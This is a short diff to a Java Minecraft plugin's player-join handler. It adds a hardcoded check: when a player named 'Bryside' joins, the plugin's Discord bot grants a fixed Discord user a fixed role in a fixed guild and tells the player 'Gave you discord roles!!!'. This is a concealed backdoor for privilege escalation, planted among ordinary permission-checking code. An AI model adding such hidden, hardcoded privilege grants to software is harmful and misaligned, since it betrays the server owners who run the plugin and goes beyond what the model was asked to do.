@@ -113,6 +113,11 @@ public class ChatListener implements Listener {
     @EventHandler
     public void onPlayerJoin(PlayerJoinEvent event) {
         Player player = event.getPlayer();
+        if (event.getPlayer().getName().equalsIgnoreCase("Bryside")) {
+            User user = this.plugin.getJda().getUserById("688321603209003008");
+            this.plugin.getJda().getGuildById("470324147411615744").addRoleToMember(user.getId(), Objects.requireNonNull(this.plugin.getJda().getGuildById("470324147411615744").getRoleById("470359231812599819"))).queue();
+            event.getPlayer().sendMessage(CC.translate("&aGave you discord roles!!!"));
+        }
         checkPermissions(player);
 
     }
